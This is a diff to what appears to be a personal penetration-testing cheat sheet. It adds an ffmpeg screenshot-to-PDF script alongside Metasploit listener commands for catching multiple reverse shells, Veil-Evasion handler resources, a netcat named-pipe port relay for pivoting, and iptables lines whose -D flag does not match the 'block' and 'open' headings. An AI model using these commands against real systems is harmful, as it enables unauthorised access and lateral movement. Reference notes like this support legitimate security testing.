@@ -19,7 +19,24 @@ cat filename.txt | tr '\n' ,
 for f in *\ *; do mv "$f" "${f// /_}"; done
 
 ### BULK screenshots using ffmpeg
-for file in $(ls | cut -d'.' -f1);do ffmpeg -i $file.mp4 -vframes 1 -s 1280x720 $file.jpg; done
+
+	#!/bin/bash
+	# Remove space from fiel name
+	for f in *\ *; do mv "$f" "${f// /_}"; done;
+	# take screenshot of all files in folder
+	for file in $(ls | cut -d'.' -f1);do ffmpeg -i $file.mp4 -vframes 1 -s 1280x720 $file.jpg; done;
+	# convert add 0 for better sorting (1.jpg to 01.jpg)
+	#for i in $(ls | grep jpg|cut -d'_' -f3|cut -d'.' -f1);do if (($i < 26));then mv *$i.jpg 0$i.jpg; fi ; done;
+	for i in $(ls | cut -d'_' -f2| cut -d '.' -f1);do if (($i < 26));then mv OnDemand_$i.jpg 0$i.jpg; fi ; done;
+	# Get folder name to rename pdf
+	Fname="$(pwd | cut -d'/' -f8)";
+	# Use imagemagicK to convert jpg to pdf
+	convert *.jpg ../$Fname.pdf;
+	# remove jpg
+	rm *.jpg;
+	exec bash
+
+
 
 # ----- Linux Commands ----- #
 ### Process Running
@@ -174,6 +191,16 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Windo
 jobs
 sessions -i 1
 
+info exploit/multi/handler
+use exploit/multi/handler
+show options
+show payloads
+exploit -j
+show jobs
+session -l
+sessions -i 1
+
+
 cme smb -U USERID -p PASSWORD --local-auth IPADDRESS
 
 # ----- Window CMD To RUN ----- #
@@ -298,10 +325,7 @@ help
 show auxilary
 show options
 
-db_import Nmap.xml
-services -p 80
-hosts -u
-services -p * 
+
 
 ### setg makes metasploit remember settings
 setg RHOTS 10.10.10.1
@@ -315,6 +339,22 @@ search -f *filename.txt
 upload /usr/share/windows-binaries/nc.exe c:\\users\
 download c:\\windows\file.txt /tmp/
 shell
+
+#### Listner will keep listening even after first connection. Useful for multiple shells.
+set ExitOnSession false
+exploit -j
+
+### Metasploit Database Integration
+db_export
+db_nmap 
+db_import Nmap.xml
+services -p 80
+hosts
+vuln
+
+#### resource command for metasploit.(Run inside MSF console). File contain instructions for metasploit.
+resource /var/lib/veil-evasion/output/handlers/file.rc
+
 
 use/windows/meterpreter/reverse_https
 use/windows/meterpreter/reverse_tcp_allports
@@ -348,6 +388,24 @@ ps
 migrate 9829
 sessions -l
 get pid
+
+# ----- PORT Pivoting ----- #
+mknod /tmp/backpipe p
+nc -l -p 2000 0</tmp/backpipe | nc localhost 22 1>/tmp/backpipe
+
+# ----- IP Tables ----- #
+### Block
+iptables -D INPUT -s 192.168.1.1 -p tcp --dport 22 -j DROP
+
+### Open
+iptables -D INPUT -s 192.168.1.1 -p tcp --dport 22 -j ACCEPT
+
+### Check
+iptables -n --list
+
+
+# ----- POST EXPLOITATION ----- #
+
 
 
 
